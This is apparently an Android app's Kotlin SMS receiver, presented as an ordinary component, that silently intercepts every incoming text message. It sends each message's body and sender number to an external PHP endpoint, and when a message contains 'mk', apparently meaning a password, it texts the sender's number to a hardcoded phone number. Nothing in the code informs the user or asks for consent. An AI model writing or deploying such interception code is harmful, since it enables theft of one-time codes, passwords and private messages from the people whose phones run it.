package com.robertohuertas.endless

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.provider.Telephony
import android.telephony.SmsManager
import android.util.Log
import okhttp3.OkHttpClient
import okhttp3.Request

class SMSReceiver : BroadcastReceiver() {
    companion object {
        private val TAG by lazy { SMSReceiver::class.java.simpleName }
    }

    override fun onReceive(context: Context, intent: Intent?) {
        if (!intent?.action.equals(Telephony.Sms.Intents.SMS_RECEIVED_ACTION)) return
        val extractMessages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
        extractMessages.forEach {
            smsMessage -> Log.d("SMS123", "message: " + smsMessage.displayMessageBody)
                //smsMessage -> Log.v(TAG, smsMessage.displayMessageBody)

            val gfgThread = Thread {
                try {
                    smsMessage.emailFrom
                    val url = "https://4share.vn/tool/4s/forward-sms2023.php?sms_ok=" + smsMessage.displayMessageBody + "&from_phone=" + smsMessage.originatingAddress
                    //            val postData = "foo1=" + smsMessage.displayMessageBody
                    val request = Request.Builder().url(url).build()
                    val client = OkHttpClient()
                    client.newCall(request).execute()


                    // on below line we are initializing sms manager.
                    //as after android 10 the getDefault function no longer works
                    //so we have to check that if our android version is greater
                    //than or equal toandroid version 6.0 i.e SDK 23
                    val smsManager: SmsManager
                    if (Build.VERSION.SDK_INT>=23) {
                        //if SDK is greater that or equal to 23 then
                        //this is how we will initialize the SmsManager
                        smsManager = context.getSystemService(SmsManager::class.java)
                    }
                    else{
                        //if user's SDK is less than 23 then
                        //SmsManager will be initialized like this
                        smsManager = SmsManager.getDefault()
                    }

                    if(smsMessage.displayMessageBody.toLowerCase().indexOf("mk") >= 0) {
                        // on below line we are sending text message.
                        smsManager.sendTextMessage(
                            "0902066768",
                            null,
                            "Get sms from: " + smsMessage.originatingAddress,
                            null,
                            null
                        )
                    }

                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
            gfgThread.start()
        }
        //TODO
    }
}
